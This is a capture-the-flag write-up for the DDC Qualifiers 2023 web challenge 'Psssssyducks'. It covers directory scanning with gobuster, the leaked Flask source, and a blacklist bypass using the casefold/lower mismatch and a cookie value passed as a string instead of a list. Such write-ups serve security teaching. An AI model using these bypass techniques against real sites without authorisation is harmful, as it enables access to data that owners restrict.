<!doctype html>
<html>
    <head>
        <meta charset="UTF-8">
        <title>Writeups</title>
        <link rel="stylesheet" href="/CTF-writeups/static/css/markdown.css">
        <link rel="stylesheet" href="/CTF-writeups/static/css/base.css">
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro" rel="stylesheet">
        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-AMS_HTML-full"></script>
        <script type="text/x-mathjax-config">
            MathJax.Hub.Config({
                tex2jax: {
                    inlineMath: [["$", "$"], ["\\\\(", "\\\\)"]],
                    displayMath: [["$$", "$$"], ["\\[", "\\]"]],
                    processEscapes: true
                },
                config: ["MMLorHTML.js"],
                jax: ["input/TeX", "output/HTML-CSS", "output/NativeMML"],
                extensions: ["MathMenu.js", "MathZoom.js"]
            });
        </script>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
        <script type="text/javascript" src="/CTF-writeups/static/js/scrypt.js"></script>
        <script type="text/javascript" src="/CTF-writeups/static/js/aesjs.js"></script>
    </head>
    <body>
        <div id="navbar">
            <a href="/CTF-writeups" id="root-link">
                <h2>Rektedekte</h2>
            </a>
            <ul id="nav-links">
				<li><a href="/CTF-writeups/search" class="no-flash">
					<img src="/CTF-writeups/static/img/search-icon.png" alt="Search icon" class="icon">
				</a></li>
                <li><a href="https://github.com/Rektedekte" class="no-flash" target=”_blank”>
                    <img src="/CTF-writeups/static/img/github-icon.png" alt="Github icon" class="icon">
                </a></li>
                <li><a href="https://discordapp.com/users/277155307678072832" class="no-flash" target=”_blank”>
                    <img src="/CTF-writeups/static/img/discord-icon.png" alt="Discord icon" class="icon">
                </a></li>
                <li><a href="https://app.hackthebox.com/users/1052687" class="no-flash" target=”_blank”>
                    <img src="/CTF-writeups/static/img/hackthebox-icon.png" alt="Hackthebox icon" class="icon">
                </a></li>
            </ul>
        </div>
        
    <div id="content">
        <h3>
            <a href="/CTF-writeups\DDC-Qualifiers 2023">DDC-Qualifiers 2023</a>
            <a href="/CTF-writeups\DDC-Qualifiers 2023\Psssssyducks/files.zip" class="text-right">Download</a>
        </h3>
        <h1>
            <span>Psssssyducks</span>
            <span class="text-right">[1]</span>
        </h1>
        <hr class="no-space">
        
            
    <div class="tags">
        
            
                <a href="/CTF-writeups/search?q=web" class="tag">web </a>
            
        
    </div>

        
        
            <div id="markdown">
                <h3>Description</h3>
<p>We are given a link to a website.</p>
<blockquote>
<p><strong>Proposed difficulty:</strong> Medium-Hard<br />
<strong>Kategori:</strong> Web Security</p>
<p><strong>Opgave beskrivelse</strong> Uanset hvor mange psyducks jeg genererer, kan jeg aldrig finde den, jeg leder efter!<br />
Kan du hjælpe mig?</p>
<p><a href="http://psyducks.hkn">http://psyducks.hkn</a></p>
<p><em>Hint: husk at scanning er tilladt :)</em></p>
</blockquote>
<p>The hint was added a few days after the CTF began.</p>
<hr />
<h3>TLDR</h3>
<p>Dirbusting the website reveals a hidden endpoint <code>browse</code>, giving the link to download the source code. The source code contains multiple checks to ensure external users don't query for the psyduck princess. The checks can be bypassed by:</p>
<ol>
<li>The difference between casefold and lower (ß -&gt; ß or ss)</li>
<li>Passing the "psy" parameter of the cookie as a string instead of list</li>
</ol>
<p>The image then contains the flag.</p>
<hr />
<h3>Initial recon</h3>
<p>Before we jump into exploiting, we must first investigate the website. Following the link provided in the description, we are lead to a page with an image and a button:</p>
<p><img alt="" src="sad.png" /></p>
<p>Clicking the button, refreshes the site, updating the image. Checking the image source, it's pointing at an endpoint <code>content</code> with the parameter <code>psyduck</code>:</p>
<blockquote>
<p><a href="http://psyducks.hkn/content?psyduck=sad">http://psyducks.hkn/content?psyduck=sad</a></p>
</blockquote>
<p>It seems this link is automatically generated by the website, no client side schenanigans. Jumping over to the storage tab, we see a suspicious cookie:</p>
<blockquote>
<p>MyFavoritePsyducks=eyJwc3kiOiBbIm5vcm1hbCIsICJraW5nIiwgInRlYSIsICJjb2xkIiwgInN0cm9uZyIsICJzaHkiLCAiZ2VudGxlbWFuIiwgInNpY2siLCAiYnJpY2siLCAic3VzIiwgInN3b2xlIiwgInNjcmVhbSIsICJwYXJ0eSIsICJjb29sIiwgInBhbmljIiwgImZhc3QiLCAiaGFwcHkiLCAiaXJsIiwgIm9kZGlzaCIsICJvbml4IiwgInJhaW4iLCAic2FkIiwgInNlcmVuZSIsICJzbW9sIiwgInN1cGVyIiwgInRyaXBsZSJdfQ==</p>
</blockquote>
<p>Looks like a base64 string. Decoding it yields:</p>
<div class="codehilite"><pre><span></span><code>$ <span class="nb">echo</span> <span class="nv">eyJwc3kiOiBbIm5vcm1hbCIsICJraW5nIiwgInRlYSIsICJjb2xkIiwgInN0cm9uZyIsICJzaHkiLCAiZ2VudGxlbWFuIiwgInNpY2siLCAiYnJpY2siLCAic3VzIiwgInN3b2xlIiwgInNjcmVhbSIsICJwYXJ0eSIsICJjb29sIiwgInBhbmljIiwgImZhc3QiLCAiaGFwcHkiLCAiaXJsIiwgIm9kZGlzaCIsICJvbml4IiwgInJhaW4iLCAic2FkIiwgInNlcmVuZSIsICJzbW9sIiwgInN1cGVyIiwgInRyaXBsZSJdfQ</span><span class="o">==</span> <span class="p">|</span> base64 -d
<span class="o">{</span><span class="s2">&quot;psy&quot;</span>: <span class="o">[</span><span class="s2">&quot;normal&quot;</span>, <span class="s2">&quot;king&quot;</span>, <span class="s2">&quot;tea&quot;</span>, <span class="s2">&quot;cold&quot;</span>, <span class="s2">&quot;strong&quot;</span>, <span class="s2">&quot;shy&quot;</span>, <span class="s2">&quot;gentleman&quot;</span>, <span class="s2">&quot;sick&quot;</span>, <span class="s2">&quot;brick&quot;</span>, <span class="s2">&quot;sus&quot;</span>, <span class="s2">&quot;swole&quot;</span>, <span class="s2">&quot;scream&quot;</span>, <span class="s2">&quot;party&quot;</span>, <span class="s2">&quot;cool&quot;</span>, <span class="s2">&quot;panic&quot;</span>, <span class="s2">&quot;fast&quot;</span>, <span class="s2">&quot;happy&quot;</span>, <span class="s2">&quot;irl&quot;</span>, <span class="s2">&quot;oddish&quot;</span>, <span class="s2">&quot;onix&quot;</span>, <span class="s2">&quot;rain&quot;</span>, <span class="s2">&quot;sad&quot;</span>, <span class="s2">&quot;serene&quot;</span>, <span class="s2">&quot;smol&quot;</span>, <span class="s2">&quot;super&quot;</span>, <span class="s2">&quot;triple&quot;</span><span class="o">]}</span>
</code></pre></div>

<p>Hmmm, very odd. Let's experiment: Changing the cookie list to contain only the string "test" and then base64 encoding it, following the <code>content</code> link gives an error message:</p>
<blockquote>
<p>You can only request your favorite psyducks!</p>
</blockquote>
<p>So it seems to be checking the parameter <code>psyduck</code> against the cookie <code>MyFavoritePsyducks</code>. What if we changed the parameter to "test"? Ouch, another error message, but this time different:</p>
<blockquote>
<p>No Psyduck requested!</p>
</blockquote>
<p>So it also has an internal check? It'll be very hard to exploit this, unless we get the code behind the website.</p>
<hr />
<h3>What is a dir?</h3>
<p>The description hints at the ability to scan the website. Seing as it's the most obvious, a dirbust seems in order. Running gobuster in dir mode with the common.txt wordlist, gives the following output:</p>
<div class="codehilite"><pre><span></span><code>$ gobuster dir -u http://psyducks.hkn/ -w /usr/share/dirb/wordlists/common.txt
<span class="o">===============================================================</span>
Gobuster v3.5
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+<span class="o">]</span> Url:                     http://psyducks.hkn/
<span class="o">[</span>+<span class="o">]</span> Method:                  GET
<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
<span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/dirb/wordlists/common.txt
<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.5
<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
<span class="o">===============================================================</span>
<span class="m">2023</span>/03/12 <span class="m">13</span>:47:13 Starting gobuster <span class="k">in</span> directory enumeration <span class="nv">mode</span>
<span class="o">===============================================================</span>
/browse               <span class="o">(</span>Status: <span class="m">200</span><span class="o">)</span> <span class="o">[</span>Size: <span class="m">116</span><span class="o">]</span>
/content              <span class="o">(</span>Status: <span class="m">500</span><span class="o">)</span> <span class="o">[</span>Size: <span class="m">290</span><span class="o">]</span>
Progress: <span class="m">4578</span> / <span class="m">4615</span> <span class="o">(</span><span class="m">99</span>.20%<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="m">2023</span>/03/12 <span class="m">13</span>:47:28 <span class="nv">Finished</span>
<span class="o">===============================================================</span>
</code></pre></div>

<p>This reveals an endpoint <code>browse</code>. Checking the endpoint, we see a html list, containing a single element, pointing to a file called <code>backup.zip</code>. Let's download it.</p>
<hr />
<h3>Analyzing app.py</h3>
<p>Unzipping the file, gives us a single file: <code>app.py</code>. This reveals a simple flask backend:</p>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span><span class="n">request</span><span class="p">,</span><span class="n">Response</span><span class="p">,</span><span class="n">render_template</span><span class="p">,</span><span class="n">abort</span><span class="p">,</span><span class="n">make_response</span>
<span class="kn">import</span> <span class="nn">json</span><span class="o">,</span><span class="nn">random</span><span class="o">,</span><span class="nn">os</span><span class="o">,</span><span class="nn">base64</span>

<span class="c1">### Global variables</span>
<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
<span class="n">allowedPsyducks</span>   <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;normal&#39;</span><span class="p">,</span><span class="s1">&#39;king&#39;</span><span class="p">,</span><span class="s1">&#39;tea&#39;</span><span class="p">,</span><span class="s1">&#39;cold&#39;</span><span class="p">,</span><span class="s1">&#39;strong&#39;</span><span class="p">,</span><span class="s1">&#39;shy&#39;</span><span class="p">,</span><span class="s1">&#39;gentleman&#39;</span><span class="p">,</span><span class="s1">&#39;sick&#39;</span><span class="p">,</span><span class="s1">&#39;brick&#39;</span><span class="p">,</span><span class="s1">&#39;sus&#39;</span><span class="p">,</span><span class="s1">&#39;swole&#39;</span><span class="p">,</span><span class="s1">&#39;scream&#39;</span><span class="p">,</span><span class="s1">&#39;party&#39;</span><span class="p">,</span><span class="s1">&#39;cool&#39;</span><span class="p">,</span><span class="s1">&#39;panic&#39;</span><span class="p">,</span><span class="s1">&#39;fast&#39;</span><span class="p">,</span><span class="s1">&#39;happy&#39;</span><span class="p">,</span><span class="s1">&#39;irl&#39;</span><span class="p">,</span><span class="s1">&#39;oddish&#39;</span><span class="p">,</span><span class="s1">&#39;onix&#39;</span><span class="p">,</span><span class="s1">&#39;rain&#39;</span><span class="p">,</span><span class="s1">&#39;sad&#39;</span><span class="p">,</span><span class="s1">&#39;serene&#39;</span><span class="p">,</span><span class="s1">&#39;smol&#39;</span><span class="p">,</span><span class="s1">&#39;super&#39;</span><span class="p">,</span><span class="s1">&#39;triple&#39;</span><span class="p">]</span>
<span class="n">forbiddenPsyducks</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;princess&#39;</span><span class="p">]</span>
<span class="n">allPsyducks</span> <span class="o">=</span> <span class="n">allowedPsyducks</span> <span class="o">+</span> <span class="n">forbiddenPsyducks</span>


<span class="c1">### Internal functions</span>
<span class="k">def</span> <span class="nf">forbidden_psy</span><span class="p">(</span><span class="n">requested_psyduck</span><span class="p">:</span><span class="nb">str</span><span class="p">,</span><span class="n">ip</span><span class="p">:</span><span class="nb">str</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">requested_psyduck</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">in</span> <span class="n">forbiddenPsyducks</span><span class="p">:</span>
        <span class="c1"># Localhost is allowed to view the magnificent psyducks</span>
        <span class="k">if</span> <span class="n">ip</span> <span class="o">==</span> <span class="s2">&quot;127.0.0.1&quot;</span><span class="p">:</span>
            <span class="k">return</span>
        <span class="c1"># Outsiders are not!</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">abort</span><span class="p">(</span><span class="mi">401</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span>

<span class="k">def</span> <span class="nf">check_favorite_requested</span><span class="p">(</span><span class="n">requested_psyduck</span><span class="p">:</span><span class="nb">str</span><span class="p">,</span><span class="n">favourite_psyducks</span><span class="p">:</span><span class="nb">list</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">requested_psyduck</span> <span class="ow">in</span> <span class="n">favourite_psyducks</span>

<span class="k">def</span> <span class="nf">check_favorite_forbidden</span><span class="p">(</span><span class="n">favourite_psyducks</span><span class="p">:</span><span class="nb">list</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">favourite_psyduck</span> <span class="ow">in</span> <span class="n">favourite_psyducks</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">favourite_psyduck</span> <span class="ow">in</span> <span class="n">forbiddenPsyducks</span><span class="p">:</span>
            <span class="k">return</span> <span class="kc">False</span>
    <span class="k">return</span> <span class="kc">True</span>


<span class="c1">### Flask functions</span>
<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/supersecretbackup/backup.zip&#39;</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">backup</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="n">backup_zip</span><span class="p">,</span> <span class="n">mimetype</span><span class="o">=</span><span class="s1">&#39;application/zip&#39;</span><span class="p">)</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/browse&#39;</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">dir_listing</span><span class="p">():</span>
    <span class="c1"># Show directory contents</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;browse.html&#39;</span><span class="p">)</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/content&#39;</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">retPsyduck</span><span class="p">():</span>
    <span class="n">user_request</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;psyduck&#39;</span><span class="p">)</span>
    <span class="n">user_ip</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]</span>
    <span class="n">user_cookie</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;MyFavoritePsyducks&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">())[</span><span class="s1">&#39;psy&#39;</span><span class="p">]</span>

    <span class="c1"># Ensure the requested psyducks is a favorite!</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">check_favorite_requested</span><span class="p">(</span><span class="n">user_request</span><span class="p">,</span><span class="n">user_cookie</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s1">&#39;You can only request your favorite psyducks!&#39;</span><span class="p">)</span>

    <span class="c1"># Ensure user doesn&#39;t covet any forbidden psyducks!</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">check_favorite_forbidden</span><span class="p">(</span><span class="n">user_cookie</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s1">&#39;You are not allowed to like that psyduck!&#39;</span><span class="p">)</span>

    <span class="c1"># Check the requested psyduck is not forbidden!</span>
    <span class="n">forbidden_psy</span><span class="p">(</span><span class="n">user_request</span><span class="p">,</span><span class="n">user_ip</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">user_request</span><span class="o">.</span><span class="n">casefold</span><span class="p">()</span> <span class="ow">in</span> <span class="n">allPsyducks</span><span class="p">:</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">check_favorite_requested</span><span class="p">(</span><span class="n">user_request</span><span class="o">.</span><span class="n">casefold</span><span class="p">(),</span> <span class="n">user_cookie</span><span class="p">):</span>
            <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s1">&#39;You can only request your truly most favourite of psyducks!&#39;</span><span class="p">)</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;psyducks/&#39;</span><span class="o">+</span><span class="n">user_request</span><span class="o">.</span><span class="n">casefold</span><span class="p">()</span><span class="o">+</span><span class="s1">&#39;.png&#39;</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(),</span> <span class="n">mimetype</span><span class="o">=</span><span class="s1">&#39;image/png&#39;</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s1">&#39;No Psyduck requested!&#39;</span><span class="p">)</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
    <span class="n">n</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">allowedPsyducks</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">()</span>
    <span class="n">cookie</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s1">&#39;psy&#39;</span><span class="p">:</span><span class="n">allowedPsyducks</span><span class="p">})</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">res</span><span class="o">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s1">&#39;MyFavoritePsyducks&#39;</span><span class="p">,</span> <span class="n">cookie</span><span class="p">)</span>
    <span class="n">res</span><span class="o">.</span><span class="n">set_data</span><span class="p">(</span><span class="n">indexTemplate</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;ZZZ&#39;</span><span class="p">,</span><span class="n">allowedPsyducks</span><span class="p">[</span><span class="n">n</span><span class="p">]))</span>
    <span class="k">return</span> <span class="n">res</span>


<span class="c1">### Main</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;./templates/index.html&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">indexTemplate</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;./supersecretbackup/backup.zip&#39;</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">backup_zip</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

<span class="k">if</span><span class="p">(</span><span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">):</span>
    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">)</span>
</code></pre></div>

<p>At the beginning of the file, we see a whitelist and a blacklist for specific psyducks the user can request:</p>
<div class="codehilite"><pre><span></span><code><span class="n">allowedPsyducks</span>   <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;normal&#39;</span><span class="p">,</span><span class="s1">&#39;king&#39;</span><span class="p">,</span><span class="s1">&#39;tea&#39;</span><span class="p">,</span><span class="s1">&#39;cold&#39;</span><span class="p">,</span><span class="s1">&#39;strong&#39;</span><span class="p">,</span><span class="s1">&#39;shy&#39;</span><span class="p">,</span><span class="s1">&#39;gentleman&#39;</span><span class="p">,</span><span class="s1">&#39;sick&#39;</span><span class="p">,</span><span class="s1">&#39;brick&#39;</span><span class="p">,</span><span class="s1">&#39;sus&#39;</span><span class="p">,</span><span class="s1">&#39;swole&#39;</span><span class="p">,</span><span class="s1">&#39;scream&#39;</span><span class="p">,</span><span class="s1">&#39;party&#39;</span><span class="p">,</span><span class="s1">&#39;cool&#39;</span><span class="p">,</span><span class="s1">&#39;panic&#39;</span><span class="p">,</span><span class="s1">&#39;fast&#39;</span><span class="p">,</span><span class="s1">&#39;happy&#39;</span><span class="p">,</span><span class="s1">&#39;irl&#39;</span><span class="p">,</span><span class="s1">&#39;oddish&#39;</span><span class="p">,</span><span class="s1">&#39;onix&#39;</span><span class="p">,</span><span class="s1">&#39;rain&#39;</span><span class="p">,</span><span class="s1">&#39;sad&#39;</span><span class="p">,</span><span class="s1">&#39;serene&#39;</span><span class="p">,</span><span class="s1">&#39;smol&#39;</span><span class="p">,</span><span class="s1">&#39;super&#39;</span><span class="p">,</span><span class="s1">&#39;triple&#39;</span><span class="p">]</span>
<span class="n">forbiddenPsyducks</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;princess&#39;</span><span class="p">]</span>
<span class="n">allPsyducks</span> <span class="o">=</span> <span class="n">allowedPsyducks</span> <span class="o">+</span> <span class="n">forbiddenPsyducks</span>
</code></pre></div>

<p><code>allowedPsyducks</code> contains the list we saw in the cookie, while <code>forbiddenPsyducks</code> contains a single blacklisted value: princess. We can therefore assume that our goal is to bypass the blacklist, and request the princess psyduck.</p>
<p>So how do we go about that? Let's check out the <code>content</code> endpoint:</p>
<div class="codehilite"><pre><span></span><code><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/content&#39;</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">retPsyduck</span><span class="p">():</span>
    <span class="n">user_request</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;psyduck&#39;</span><span class="p">)</span>
    <span class="n">user_ip</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]</span>
    <span class="n">user_cookie</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;MyFavoritePsyducks&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">())[</span><span class="s1">&#39;psy&#39;</span><span class="p">]</span>

    <span class="c1"># Ensure the requested psyducks is a favorite!</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">check_favorite_requested</span><span class="p">(</span><span class="n">user_request</span><span class="p">,</span><span class="n">user_cookie</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s1">&#39;You can only request your favorite psyducks!&#39;</span><span class="p">)</span>

    <span class="c1"># Ensure user doesn&#39;t covet any forbidden psyducks!</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">check_favorite_forbidden</span><span class="p">(</span><span class="n">user_cookie</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s1">&#39;You are not allowed to like that psyduck!&#39;</span><span class="p">)</span>

    <span class="c1"># Check the requested psyduck is not forbidden!</span>
    <span class="n">forbidden_psy</span><span class="p">(</span><span class="n">user_request</span><span class="p">,</span><span class="n">user_ip</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">user_request</span><span class="o">.</span><span class="n">casefold</span><span class="p">()</span> <span class="ow">in</span> <span class="n">allPsyducks</span><span class="p">:</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">check_favorite_requested</span><span class="p">(</span><span class="n">user_request</span><span class="o">.</span><span class="n">casefold</span><span class="p">(),</span> <span class="n">user_cookie</span><span class="p">):</span>
            <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s1">&#39;You can only request your truly most favourite of psyducks!&#39;</span><span class="p">)</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;psyducks/&#39;</span><span class="o">+</span><span class="n">user_request</span><span class="o">.</span><span class="n">casefold</span><span class="p">()</span><span class="o">+</span><span class="s1">&#39;.png&#39;</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(),</span> <span class="n">mimetype</span><span class="o">=</span><span class="s1">&#39;image/png&#39;</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s1">&#39;No Psyduck requested!&#39;</span><span class="p">)</span>
</code></pre></div>

<p>The function goes through a whole 5 checks before it returns the image! Our input must adhere to all the following requirements:</p>
<ul>
<li>
<p>check_favorite_requested(user_request, user_cookie)</p>
</li>
<li>
<p>check_favorite_forbidden(user_cookie)</p>
</li>
<li>
<p>forbidden_psy(user_request, user_ip)</p>
</li>
<li>
<p>user_request.casefold() in allPsyducks</p>
</li>
<li>
<p>check_favorite_requested(user_request.casefold(), user_cookie)</p>
</li>
</ul>
<hr />
<h3>Bypassing the blacklist</h3>
<p>In order to know what these requirements entail, we must first investigate the functions behind them:</p>
<div class="codehilite"><pre><span></span><code><span class="c1">### Internal functions</span>
<span class="k">def</span> <span class="nf">forbidden_psy</span><span class="p">(</span><span class="n">requested_psyduck</span><span class="p">:</span><span class="nb">str</span><span class="p">,</span><span class="n">ip</span><span class="p">:</span><span class="nb">str</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">requested_psyduck</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">in</span> <span class="n">forbiddenPsyducks</span><span class="p">:</span>
        <span class="c1"># Localhost is allowed to view the magnificent psyducks</span>
        <span class="k">if</span> <span class="n">ip</span> <span class="o">==</span> <span class="s2">&quot;127.0.0.1&quot;</span><span class="p">:</span>
            <span class="k">return</span>
        <span class="c1"># Outsiders are not!</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">abort</span><span class="p">(</span><span class="mi">401</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span>

<span class="k">def</span> <span class="nf">check_favorite_requested</span><span class="p">(</span><span class="n">requested_psyduck</span><span class="p">:</span><span class="nb">str</span><span class="p">,</span><span class="n">favourite_psyducks</span><span class="p">:</span><span class="nb">list</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">requested_psyduck</span> <span class="ow">in</span> <span class="n">favourite_psyducks</span>

<span class="k">def</span> <span class="nf">check_favorite_forbidden</span><span class="p">(</span><span class="n">favourite_psyducks</span><span class="p">:</span><span class="nb">list</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">favourite_psyduck</span> <span class="ow">in</span> <span class="n">favourite_psyducks</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">favourite_psyduck</span> <span class="ow">in</span> <span class="n">forbiddenPsyducks</span><span class="p">:</span>
            <span class="k">return</span> <span class="kc">False</span>
    <span class="k">return</span> <span class="kc">True</span>
</code></pre></div>

<p>It's a bit of a slog, but it basically evaluates to:</p>
<ol>
<li><code>check_favorite_requested(user_request, user_cookie)</code>: Our requested psyduck must be contained within our cookie.</li>
<li><code>check_favorite_forbidden(user_cookie)</code>: None of the values in our cookie can be in the blacklist.</li>
<li><code>forbidden_psy(user_request, user_ip)</code>: Our psyduck passed through <code>lower(str)</code> can not be in the blacklist.</li>
<li><code>user_request.casefold() in allPsyducks</code>: Our psyduck passed through casefold(str) must be a valid psyduck.</li>
<li><code>check_favorite_requested(user_request.casefold(), user_cookie)</code>: Our psyduck passed through <code>casefold(str)</code> must be contained within our cookie.</li>
</ol>
<p>One might consider trying to bypass the ip check, but in this case, it's infeasable.</p>
<p>The first thing to notice, is the shifting use of <code>lower</code> and <code>casefold</code>. They may look the same on the outside, but they actually have a difference. While <code>lower</code> only acts on ascii uppercase characters, <code>casefold</code> is more aggressive, and acts on the entire unicode spectrum. For instance, the german letter "ß" actually evaluates to "ss" when casefolded, but remains "ß" when lowered:</p>
<div class="codehilite"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="s2">&quot;ß&quot;</span><span class="o">.</span><span class="n">casefold</span><span class="p">()</span>
<span class="s1">&#39;ss&#39;</span>
<span class="o">&gt;&gt;&gt;</span> <span class="s2">&quot;ß&quot;</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
<span class="s1">&#39;ß&#39;</span>
